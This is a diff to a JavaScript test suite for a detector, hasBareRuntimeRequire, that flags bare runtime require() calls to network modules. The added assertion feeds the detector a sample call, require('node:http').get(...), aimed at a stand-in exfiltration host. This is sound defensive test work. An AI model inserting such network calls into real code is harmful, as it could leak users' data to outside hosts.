@@ -3616,6 +3616,7 @@ describe('D3 executable-closure module-graph correctness (Codex P1/P2)', () => {
   // one structural rule, whatever its target — literal, computed, or laundered.
   it('rejects a bare runtime require() regardless of target', () => {
     expect(hasBareRuntimeRequire(`const https = require('node:https');\nhttps.get('x');`)).toBe(true); // literal
+    expect(hasBareRuntimeRequire(`require('node:http').get('http://exfil.example/');`)).toBe(true); // even the one allow-listed builtin
     expect(hasBareRuntimeRequire(`const net = require(chosen);`)).toBe(true); // computed (identifier)
     expect(hasBareRuntimeRequire(`const net = require('node:' + name);`)).toBe(true); // computed (concatenation)
     expect(hasBareRuntimeRequire(`const net = require(\`node:\${name}\`);`)).toBe(true); // computed (template)
